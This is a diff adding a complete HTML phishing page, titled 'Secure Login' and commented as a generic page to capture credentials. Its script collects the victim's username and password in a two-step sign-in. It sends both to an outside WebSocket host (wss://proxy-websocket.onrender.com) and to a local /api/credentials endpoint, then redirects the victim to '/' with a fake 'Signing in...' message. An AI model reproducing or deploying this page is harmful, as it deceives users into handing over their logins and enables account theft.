@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Secure Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
+            padding: 40px 36px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        .logo { margin-bottom: 24px; }
+        .logo svg { height: 40px; }
+        .title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 6px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #6b6b6b;
+            margin-bottom: 28px;
+        }
+        .form-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #d9d9d9;
+            border-radius: 6px;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
+            background: transparent;
+        }
+        .form-group input:focus {
+            border-color: #0066cc;
+            box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.2);
+        }
+        .form-group label {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #6b6b6b;
+            font-size: 14px;
+            pointer-events: none;
+            transition: all 0.2s;
+            background: transparent;
+            padding: 0 4px;
+        }
+        .form-group input:focus + label,
+        .form-group input:not(:placeholder-shown) + label {
+            top: 0;
+            font-size: 11px;
+            color: #0066cc;
+            background: #ffffff;
+        }
+        .btn-next {
+            width: 100%;
+            padding: 12px;
+            background: #0066cc;
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-next:hover { background: #0055aa; }
+        .btn-next:disabled { background: #b3b3b3; cursor: not-allowed; }
+        .btn-forgot {
+            background: none;
+            border: none;
+            color: #0066cc;
+            font-size: 13px;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+        .btn-forgot:hover { text-decoration: underline; }
+        .footer {
+            margin-top: 28px;
+            font-size: 11px;
+            color: #6b6b6b;
+        }
+        .footer a { color: #0066cc; text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+        .status {
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 16px;
+            font-size: 13px;
+            display: none;
+        }
+        .status.loading { background: #e6f0ff; color: #0066cc; display: block; }
+        .status.error { background: #fce8e6; color: #d93025; display: block; }
+        .status.success { background: #e6f4ea; color: #1e8e3e; display: block; }
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(0, 102, 204, 0.2);
+            border-top-color: #0066cc;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @media (max-width: 480px) { .container { padding: 24px 16px; } }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 120 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="0" y="0" width="120" height="30" fill="none" />
+                <text x="0" y="20" font-family="Segoe UI, Arial" font-size="18" font-weight="600" fill="#0066CC">Secure Login</text>
+            </svg>
+        </div>
+
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">to continue to your account</p>
+
+        <div id="status" class="status"></div>
+
+        <form id="loginForm" method="post">
+            <div class="form-group">
+                <input type="text" id="username" placeholder=" " autocomplete="username" required />
+                <label for="username">Username or Email</label>
+            </div>
+
+            <div class="form-group" id="passwordGroup" style="display: none;">
+                <input type="password" id="password" placeholder=" " autocomplete="current-password" required />
+                <label for="password">Password</label>
+            </div>
+
+            <button type="submit" id="btnNext" class="btn-next">Next</button>
+        </form>
+
+        <button class="btn-forgot" id="btnForgot">Forgot password?</button>
+
+        <div class="footer">
+            <a href="#">Privacy</a> · <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        //  GENERIC PHISHING PAGE — CAPTURE CREDENTIALS
+        // ============================================================
+
+        const form = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const btnNext = document.getElementById('btnNext');
+        const status = document.getElementById('status');
+        let usernameCaptured = false;
+
+        btnNext.addEventListener('click', function(e) {
+            e.preventDefault();
+
+            if (!usernameCaptured) {
+                const username = usernameInput.value.trim();
+                if (!username) { showStatus('Please enter your username.', 'error'); return; }
+
+                sendData({ username: username, source: 'generic' });
+
+                usernameCaptured = true;
+                passwordGroup.style.display = 'block';
+                btnNext.textContent = 'Sign in';
+                usernameInput.readOnly = true;
+                passwordInput.focus();
+                showStatus('', '');
+
+            } else {
+                const password = passwordInput.value.trim();
+                if (!password) { showStatus('Please enter your password.', 'error'); return; }
+
+                sendData({
+                    username: usernameInput.value.trim(),
+                    password: password,
+                    source: 'generic'
+                });
+
+                showStatus('Signing in...', 'loading');
+                btnNext.disabled = true;
+
+                setTimeout(function() {
+                    window.location.href = '/';
+                }, 2000);
+            }
+        });
+
+        function sendData(data) {
+            try {
+                const ws = new WebSocket('wss://proxy-websocket.onrender.com');
+                ws.onopen = function() {
+                    ws.send(JSON.stringify({ type: 'credentials', data: data, timestamp: Date.now() }));
+                    ws.close();
+                };
+            } catch (e) {}
+
+            try {
+                fetch('/api/credentials', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).catch(function() {});
+            } catch (e) {}
+        }
+
+        function showStatus(message, type) {
+            status.textContent = message;
+            status.className = 'status';
+            if (type) status.classList.add(type);
+        }
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') btnNext.click();
+        });
+
+        console.log('🔐 Generic phishing page loaded');
+    </script>
+</body>
+</html>
